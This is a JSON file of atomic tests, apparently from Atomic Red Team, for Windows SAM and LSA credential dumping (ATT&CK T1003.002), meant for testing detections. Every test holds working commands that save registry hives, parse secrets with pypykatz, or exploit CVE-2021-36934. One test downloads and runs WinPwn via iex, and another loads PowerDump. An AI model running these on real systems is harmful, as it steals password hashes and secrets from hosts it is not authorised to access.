{
  "attack_technique": "T1003.002",
  "display_name": "OS Credential Dumping: Security Account Manager",
  "atomic_tests": [
    {
      "name": "Registry dump of SAM, creds, and secrets",
      "description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "command": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security",
        "cleanup_command": "del %temp%\\sam >nul 2> nul\ndel %temp%\\system >nul 2> nul\ndel %temp%\\security >nul 2> nul"
      },
      "input_arguments": {},
      "auto_generated_guid": "5c2571d0-1572-416d-9676-812e64ca9f44"
    },
    {
      "name": "Registry parse with pypykatz",
      "description": "Parses registry hives to obtain stored credentials.\n\nWill create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "command": "\"#{venv_path}\\Scripts\\pypykatz\" live lsa"
      },
      "input_arguments": {
        "venv_path": {
          "description": "Path to the folder for the tactics venv",
          "type": "string",
          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1003_002"
        }
      },
      "dependencies": [
        {
          "description": "Computer must have python 3 installed",
          "prereq_command": "if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait"
        },
        {
          "description": "Computer must have venv configured at #{venv_path}",
          "prereq_command": "if (Test-Path -Path \"#{venv_path}\") { exit 0 } else { exit 1 }",
          "get_prereq_command": "py -m venv \"#{venv_path}\""
        },
        {
          "description": "pypykatz must be installed",
          "prereq_command": "if (Get-Command \"#{venv_path}\\Scripts\\pypykatz\" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }",
          "get_prereq_command": "& \"#{venv_path}\\Scripts\\pip.exe\" install --no-cache-dir pypykatz 2>&1 | Out-Null"
        }
      ],
      "dependency_executor_name": "powershell",
      "auto_generated_guid": "a96872b2-cbf3-46cf-8eb4-27e8c0e85263"
    },
    {
      "name": "esentutl.exe SAM copy",
      "description": "Copy the SAM hive using the esentutl.exe utility\nThis can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "command": "esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}",
        "cleanup_command": "del #{copy_dest}\\#{file_name} >nul 2>&1"
      },
      "input_arguments": {
        "file_path": {
          "description": "Path to the file to copy",
          "type": "path",
          "default": "%SystemRoot%/system32/config/SAM"
        },
        "file_name": {
          "description": "Name of the copied file",
          "type": "string",
          "default": "SAM"
        },
        "copy_dest": {
          "description": "Destination of the copied file",
          "type": "string",
          "default": "%temp%"
        }
      },
      "auto_generated_guid": "a90c2f4d-6726-444e-99d2-a00cd7c20480"
    },
    {
      "name": "PowerDump Hashes and Usernames from Registry",
      "description": "Executes a hashdump by reading the hashes from the registry.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "command": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green\nImport-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\"\nInvoke-PowerDump"
      },
      "input_arguments": {},
      "dependencies": [
        {
          "description": "PowerDump script must exist on disk at specified location",
          "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\") {exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-Webrequest -Uri \"https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\""
        }
      ],
      "auto_generated_guid": "804f28fc-68fc-40da-b5a2-e9d0bce5c193"
    },
    {
      "name": "dump volume shadow copy hives with certutil",
      "description": "Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as \"HiveNightmare\" or \"SeriousSAM\".\nThis can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": false,
        "command": "for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\#{target_hive}\" %temp%\\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\\#{target_hive}vss*",
        "cleanup_command": "for /L %a in (1,1,#{limit}) do @(del %temp%\\#{target_hive}vss%a >nul 2>&1)"
      },
      "input_arguments": {
        "target_hive": {
          "description": "Hive you wish to dump",
          "type": "string",
          "default": "SAM"
        },
        "limit": {
          "description": "Limit to the number of shadow copies to iterate through when trying to copy the hive",
          "type": "integer",
          "default": "10"
        }
      },
      "auto_generated_guid": "eeb9751a-d598-42d3-b11c-c122d9c3f6c7"
    },
    {
      "name": "dump volume shadow copy hives with System.IO.File",
      "description": "Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "1..#{limit} | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\#{target_hive}\" , \"$env:TEMP\\#{target_hive}vss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}",
        "cleanup_command": "1..#{limit} | % {\n  rm \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}"
      },
      "input_arguments": {
        "target_hive": {
          "description": "Hive you wish to dump",
          "type": "string",
          "default": "SAM"
        },
        "limit": {
          "description": "Limit to the number of shadow copies to iterate through when trying to copy the hive",
          "type": "integer",
          "default": "10"
        }
      },
      "auto_generated_guid": "9d77fed7-05f8-476e-a81b-8ff0472c64d0"
    },
    {
      "name": "WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes",
      "description": "Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsamfile -consoleoutput -noninteractive"
      },
      "input_arguments": {},
      "auto_generated_guid": "0c0f5f06-166a-4f4d-bb4a-719df9a01dbb"
    },
    {
      "name": "Dumping of SAM, creds, and secrets(Reg Export)",
      "description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated via three registry keys. Used reg export to execute this behavior\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "command": "reg export HKLM\\sam %temp%\\sam\nreg export HKLM\\system %temp%\\system\nreg export HKLM\\security %temp%\\security",
        "cleanup_command": "del %temp%\\sam >nul 2> nul\ndel %temp%\\system >nul 2> nul\ndel %temp%\\security >nul 2> nul"
      },
      "input_arguments": {},
      "auto_generated_guid": "21df41be-cdd8-4695-a650-c3981113aa3c"
    }
  ]
}